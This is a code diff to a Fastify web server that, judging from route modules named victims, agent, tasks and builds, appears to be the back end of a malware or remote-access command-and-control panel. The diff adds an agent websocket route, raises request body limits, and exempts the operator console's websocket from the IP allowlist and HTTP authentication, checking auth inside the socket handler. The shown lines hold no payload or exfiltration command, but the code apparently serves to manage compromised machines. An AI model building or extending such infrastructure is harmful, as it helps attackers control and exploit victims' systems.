@@ -16,6 +16,7 @@ import { allowlisted, clientIp } from './lib/ip';
 import { parseJsonBody } from './lib/http';
 import { authRoutes } from './routes/auth';
 import { agentRoutes } from './routes/agent';
+import { wsRoutes } from './routes/ws';
 import { victimRoutes } from './routes/victims';
 import { taskRoutes } from './routes/tasks';
 import { buildRoutes } from './routes/builds';
@@ -39,11 +40,11 @@ async function main() {
   const app = Fastify({
     logger,
     trustProxy: env.TRUST_PROXY,
-    bodyLimit: 2 * 1024 * 1024,
+    bodyLimit: 4 * 1024 * 1024,
     disableRequestLogging: env.isProd
   });
 
-  app.addContentTypeParser('application/json', { parseAs: 'buffer', bodyLimit: 2 * 1024 * 1024 }, (request, body, done) => {
+  app.addContentTypeParser('application/json', { parseAs: 'buffer', bodyLimit: 4 * 1024 * 1024 }, (request, body, done) => {
     (request as typeof request & { rawBody: Buffer }).rawBody = body as Buffer;
     try {
       done(null, parseJsonBody(body as Buffer));
@@ -63,13 +64,16 @@ async function main() {
     credentials: true,
     methods: ['GET', 'POST', 'PATCH', 'DELETE', 'OPTIONS']
   });
+  // `/api/v1/ws` and `/api/v1/ws-ticket` carry their own limits: the upgrade is
+  // exempt (rateLimit: false) and the ticket allows 12/min per device.
   await app.register(rateLimit, { global: true, max: 600, timeWindow: '1 minute', keyGenerator: (request) => clientIp(request.headers, request.socket.remoteAddress ?? '', env.TRUST_PROXY) });
   await app.register(websocket, { options: { maxPayload: 1024 * 1024 } });
 
   app.addHook('onRequest', async (request, reply) => {
     request.clientIp = clientIp(request.headers, request.socket.remoteAddress ?? '', env.TRUST_PROXY);
+    const path = request.url.split('?')[0]!;
     const loopback = request.clientIp === '127.0.0.1' || request.clientIp === '::1' || request.clientIp === '::ffff:127.0.0.1';
-    if (!loopback && !allowlisted(request.clientIp, env.allowlist) && !request.url.startsWith('/api/v1')) {
+    if (!loopback && !allowlisted(request.clientIp, env.allowlist) && !request.url.startsWith('/api/v1') && path !== '/api/console/ws') {
       return reply.code(403).send({ error: 'ip_not_allowlisted', message: 'source address not allowlisted' });
     }
     const blocked = await sameOrigin(request, reply);
@@ -79,6 +83,8 @@ async function main() {
   app.addHook('preHandler', async (request) => {
     const path = request.url.split('?')[0]!;
     if (!path.startsWith('/api/console')) return;
+    // The socket guard closes 4401 after the upgrade instead of an HTTP 401.
+    if (path === '/api/console/ws') return;
     if (PUBLIC_AUTH.has(path)) return;
     await authenticate(request);
   });
@@ -100,6 +106,7 @@ async function main() {
   });
 
   await app.register(agentRoutes, { prefix: '/api/v1' });
+  await app.register(wsRoutes, { prefix: '/api/v1' });
   await app.register(
     async (scope) => {
       await scope.register(authRoutes);
@@ -111,8 +118,8 @@ async function main() {
     { prefix: '/api/console' }
   );
 
-  // Second registration of /ws with the guard: @fastify/websocket needs it on the route.
-  app.get('/api/console/ws', { websocket: true, preValidation: wsGuard }, (socket) => {
+  app.get('/api/console/ws', { websocket: true }, async (socket, request) => {
+    if (!(await wsGuard(socket, request))) return;
     socket.send(JSON.stringify({ type: 'hello', at: Date.now() }));
     const off = subscribe((event) => {
       try {
